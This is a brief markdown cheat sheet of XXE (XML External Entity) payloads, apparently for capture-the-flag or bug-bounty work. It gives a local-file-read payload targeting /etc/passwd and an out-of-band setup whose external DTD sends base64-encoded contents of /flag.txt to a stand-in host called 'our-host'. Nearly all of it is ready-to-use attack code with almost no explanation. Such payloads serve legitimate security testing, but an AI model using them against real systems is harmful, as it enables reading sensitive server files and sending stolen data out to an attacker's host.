## XXE

### LFI

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### OOB

`external.dtd`

```xml
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://our-host/dtd.xml?%data;'>"> %eval;
```

`payload sending to server`

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
 <!ENTITY % oob SYSTEM "http://our-host-where-external-dtd-is/external.dtd">
 %oob;
]>
<root> &exfil; </root>
```

ref: https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md
